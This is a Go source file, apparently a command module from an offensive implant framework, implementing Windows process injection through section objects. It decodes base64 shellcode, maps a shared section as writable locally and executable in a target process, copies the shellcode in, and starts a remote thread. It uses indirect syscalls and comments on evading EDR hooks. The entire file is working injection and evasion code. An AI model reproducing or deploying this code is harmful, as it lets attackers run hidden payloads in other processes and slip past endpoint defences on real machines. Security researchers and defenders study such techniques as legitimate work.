//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"unsafe"

	"killa/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	kernel32ProcCreateRemoteThread = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThread")
	kernel32ProcCloseHandle        = windows.NewLazySystemDLL("kernel32.dll").NewProc("CloseHandle")
)

const (
	SECTION_ALL_ACCESS = 0x10000000 | 0x000F0000 | 0x00000001 | 0x00000002 | 0x00000004 | 0x00000008 | 0x00000010
	SEC_COMMIT         = 0x08000000
)

type SectionInjectionCommand struct{}

func (c *SectionInjectionCommand) Name() string {
	return "section-injection"
}

func (c *SectionInjectionCommand) Description() string {
	return "Perform process injection using section objects (NtCreateSection, NtMapViewOfSection)"
}

type SectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
}

func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if !IndirectSyscallsAvailable() {
		return errorResult("[!] This command requires indirect syscalls to be available")
	}

	var params SectionInjectionParams
	err := json.Unmarshal([]byte(task.Parameters), &params)
	if err != nil {
		return errorResult(fmt.Sprintf("Error parsing parameters: %v", err))
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return errorResult(fmt.Sprintf("Error decoding shellcode: %v", err))
	}

	if len(shellcode) == 0 {
		return errorResult("Error: Shellcode data is empty")
	}

	output := fmt.Sprintf("[*] Section Injection via Indirect Syscalls\n")
	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))

	// Step 1: Open Target Process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	var hProcess uintptr
	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(params.PID))
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hProcess)
	output += "[+] Opened handle to target process\n"

	// Step 2: Create a local section
	var hSection uintptr
	maxSize := uint64(len(shellcode))
	status = IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, &maxSize, windows.PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtCreateSection failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtClose(hSection)
	output += fmt.Sprintf("[+] Created section object (handle: 0x%X)\n", hSection)

	// Step 3: Map view of section in local process (RW)
	var localBaseAddr uintptr
	var viewSize uintptr
	status = IndirectNtMapViewOfSection(hSection, uintptr(windows.CurrentProcess()), &localBaseAddr, 0, 0, nil, &viewSize, 1, 0, windows.PAGE_READWRITE)
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtMapViewOfSection (local) failed: NTSTATUS 0x%X\n", status))
	}
	defer IndirectNtUnmapViewOfSection(uintptr(windows.CurrentProcess()), localBaseAddr)
	output += fmt.Sprintf("[+] Mapped section locally at: 0x%X (RW)\n", localBaseAddr)

	// Step 4: Map view of section in remote process (RX)
	var remoteBaseAddr uintptr
	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddr, 0, 0, nil, &viewSize, 1, 0, windows.PAGE_EXECUTE_READ)
	if status != 0 {
		return errorResult(output + fmt.Sprintf("[!] NtMapViewOfSection (remote) failed: NTSTATUS 0x%X\n", status))
	}
	output += fmt.Sprintf("[+] Mapped section remotely at: 0x%X (RX)\n", remoteBaseAddr)

	// Step 5: Copy shellcode into local view (which reflects into remote view)
	copy((*[1 << 30]byte)(unsafe.Pointer(localBaseAddr))[:len(shellcode):len(shellcode)], shellcode)
	output += "[+] Copied shellcode into local section view (mirrored in target)\n"

	// Step 6: Create remote thread to execute shellcode
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddr)
	if status != 0 {
		output += fmt.Sprintf("[-] IndirectNtCreateThreadEx failed: NTSTATUS 0x%X, falling back to CreateRemoteThread\n", status)
		// Fallback to standard CreateRemoteThread if IndirectNtCreateThreadEx fails (e.g. some EDRs hook it aggressively or it fails on some OS builds)
		hThread, _, err = kernel32ProcCreateRemoteThread.Call(
			hProcess,
			0, // lpThreadAttributes
			0, // dwStackSize
			remoteBaseAddr,
			0, // lpParameter
			0, // dwCreationFlags
			0, // lpThreadId
		)
		if hThread == 0 {
			return errorResult(output + fmt.Sprintf("[!] CreateRemoteThread fallback failed: %v\n", err))
		}
	}
	defer kernel32ProcCloseHandle.Call(hThread)
	output += fmt.Sprintf("[+] Created remote thread (handle: 0x%X)\n", hThread)
	output += "[+] Section injection completed successfully\n"

	return successResult(output)
}
